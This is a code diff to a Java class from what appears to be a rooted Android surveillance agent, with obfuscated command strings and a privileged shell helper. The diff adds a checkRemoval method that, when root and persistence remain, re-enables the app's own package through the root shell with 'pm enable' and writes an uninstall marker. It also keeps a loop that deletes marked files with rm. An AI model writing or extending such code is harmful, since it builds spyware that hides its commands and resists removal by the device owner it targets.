@@ -320,9 +320,9 @@ public class Root {
 		markup.serialize(al);
 	}
 
-	private static void delOldFileMarkup(Boolean isPersisten) {
+	private static void delOldFileMarkup(Boolean isPersistent) {
 		ArrayList<String> fl = markup.unserialize(new ArrayList<String>());
-		if (isPersisten && !fl.isEmpty()) {
+		if (isPersistent && !fl.isEmpty()) {
 			String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
 			for (String s : fl) {
 				command += String.format(M.e("for i in `ls  %s`; do rm $i 2>dev/null; done"), s) + "\n";
@@ -335,16 +335,53 @@ public class Root {
 		markup.removeMarkup();
 	}
 
+	static public boolean checkRemoval() {
+		if (!Status.haveRoot()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkRemoval): cannot check without root privileges"); //$NON-NLS-1$
+			}
+			return false;
+		}
+		if (Status.persistencyReady()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkRemoval): persistency remains.. enable pkg and create markup");
+			}
+			try {
+
+
+				String packageName = Status.getAppContext().getPackageName();
+				if (packageName != null) {
+					Execute.execute(String.format(M.e("%s qzx \"pm enable %s \'"), Configuration.shellFile , packageName));
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (checkRemoval): unable to get package name");
+					}
+				}
+			} catch (Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(e);//$NON-NLS-1$
+					Check.log(TAG + " (checkRemoval): Exception"); //$NON-NLS-1$
+				}
+
+			} finally {
+				Core.self().createUninstallMarkup();
+			}
+		}
+		return true;
+	}
 	synchronized static public boolean uninstallRoot() {
-		if (Status.haveRoot() == false) {
+		if (!Status.haveRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (uninstallRoot): cannot uninstall this way without root privileges"); //$NON-NLS-1$
 			}
-
 			return false;
 		}
 
-		String packageName = Status.self().getAppContext().getPackageName();
+		String packageName = Status.getAppContext().getPackageName();
 		String apkPath = Status.getApkName();
 		if (apkPath != null) {
 
